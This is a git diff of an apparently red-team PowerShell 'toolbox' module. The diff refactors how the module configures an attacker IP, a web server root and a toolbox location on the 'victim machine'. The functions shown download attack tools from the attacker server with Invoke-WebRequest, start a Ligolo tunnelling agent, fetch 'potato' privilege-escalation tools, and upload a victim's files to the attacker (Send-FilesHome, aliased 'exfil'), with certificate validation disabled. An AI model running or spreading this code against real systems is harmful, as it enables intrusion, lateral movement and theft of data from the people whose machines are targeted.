@@ -18,10 +18,33 @@
     Please ensure you have the appropriate permissions and authority before executing any scripts or functions within this package.
 #>
 
-function Global:Show-Config {
+function Global:Set-PSToolBoxConfig {
+    $Global:AttackerIP = Read-Host "Enter the attacker's IP address "
+
+    $Global:WebServerPort = Read-Host "Enter the web server port number "
+
+    $isSecure = Read-Host "Will the web server be secure? [N] (Y/N)"
+    $isSecure = $(($isSecure.ToUpper()) -eq 'Y' -or $($isSecure.ToUpper()) -eq 'YES')
+    if ($isSecure) {
+        $Global:WebServerProtocol = 'https'
+    }
+    else {
+        $Global:WebServerProtocol = 'http'
+    }
+
+    $loc = Read-Host "Enter the directory to store Toolbox items in on victim machine. [C:\users\public] "
+    if ($loc) {
+        $Global:ToolboxLocation = $loc
+    }
+    else {
+        $Global:ToolboxLocation = 'C:\users\public'
+    }
+    $Global:WebServerRoot = "$($Global:WebServerProtocol)://$($Global:AttackerIP):$($Global:WebServerPort)/"
+}
+function Global:Show-PSToolboxConfig {
     Write-Host "Current Configuration:" -ForegroundColor Cyan
     Write-Host "Attacker IP: $Global:AttackerIP"
-    Write-Host "Attacker Web Server: $Global:WebServerProtocol://$Global:AttackerIP:$Global:WebServerPort/$item"
+    Write-Host "Attacker Web Server: $Global:WebServerRoot"
     Write-Host "Toolbox Location on Victim Machine: $Global:ToolboxLocation"
 }
 function Global:Get-SingleToolboxItem {
@@ -33,7 +56,7 @@ function Global:Get-SingleToolboxItem {
     {
         $name = Split-Path $item -Leaf
     }
-    Invoke-WebRequest -Uri "$Global:WebServerProtocol://$Global:AttackerIP:$Global:WebServerPort/$item" -OutFile "$Global:ToolboxLocation\$name"
+    Invoke-WebRequest -Uri $Global:WebServerRoot + $item -OutFile "$Global:ToolboxLocation\$name"
 }
 
 function Global:Start-LigoloAgent {
@@ -95,7 +118,7 @@ function Global:Get-potatos {
 function Global:Send-FilesHome {
     param (
         [string]$dir, #Base dir 
-        [string]$url = "$($Global:WebServerProtocol)://$($Global:AttackerIP):$($Global:AttackerPort)/",
+        [string]$url = $Global:WebServerRoot,
         [switch]$recurse,
         [string]$filter = '*.*',
         [string]$id  = $env:computername #Alternate identifier for upload machine. Dirname on web server
@@ -124,7 +147,7 @@ function Global:UploadToWebServer {
         [Alias('f')]
         [string]$filepath,
         [Parameter(Mandatory = $false)]
-        [Alias('u')]$url = "$($Global:WebServerProtocol)://$($Global:AttackerIP):$($Global:AttackerPort)/"
+        [Alias('u')]$url = $Global:WebServerRoot
     )
     [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true } ;
     $filename = Split-Path $FilePath -Leaf
@@ -155,7 +178,7 @@ function Global:UploadToWebServer {
 
 function Get-FolderLinksRecursively {
     param (
-        [string]$Url = "$($Global:WebServerProtocol)://$($Global:AttackerIP):$($Global:AttackerPort)/"
+        [string]$Url = $Global:WebServerRoot
     )
     $folders = @()
     if ($url -match '/$') {
@@ -190,7 +213,7 @@ function Get-FolderLinksRecursively {
 
 function Get-FileLinks {
     param (
-        [string]$Url = "$($Global:WebServerProtocol)://$($Global:AttackerIP):$($Global:AttackerPort)/"
+        [string]$Url = $Global:WebServerRoot
     )
 
     $FQDNFileLinks = @()
@@ -217,7 +240,7 @@ function Global:Get-ToolboxItems {
     param (
         [Parameter(Mandatory = $false)]
         [Alias('u')]
-        [string]$baseUrl = "$($Global:WebServerProtocol)://$($Global:AttackerIP):$($Global:AttackerPort)/",
+        [string]$baseUrl = $Global:WebServerRoot,
 
         [Parameter(Mandatory = $true)]
         [Alias('m')]
@@ -298,37 +321,8 @@ function Global:Get-ToolboxItems {
         }
     }
 
-# Check if global IP and port are set, otherwise prompt for them
-if (-not $Global:AttackerIP) {
-    $Global:AttackerIP = Read-Host "Enter the attacker's IP address"
-}
-if (-not $Global:WebServerPort) {
-    $Global:WebServerPort = Read-Host "Enter the web server port number"
-}
-if (-not $Global:WebServerProtocol)
-{
-    $isSecure = Read-Host "Will the web server be secure? [N] (Y/N)"
-    $isSecure = $(($isSecure.ToUpper()) -eq 'Y' -or $($isSecure.ToUpper()) -eq 'YES')
-    if ($isSecure)
-    {
-        $Global:WebServerProtocol = 'https'
-    }
-    else
-    {
-        $Global:WebServerProtocol = 'http'
-    }
-}
-if (-not $Global:ToolboxLocation) {
-    $loc = Read-Host "Enter the directory to store Toolbox items in on victim machine. [C:\users\public] "
-    if ($loc)
-    {
-        $Global:ToolboxLocation = $loc
-    }
-    else {
-        $Global:ToolboxLocation = 'C:\users\public'
-    }
+Set-PSToolboxConfig
 
-}
     Set-Alias -Name gti -Value Get-ToolBoxItems
     Set-Alias -Name upload -Value UploadToWebServer
     Set-Alias -Name exfil -Value Send-FilesHome
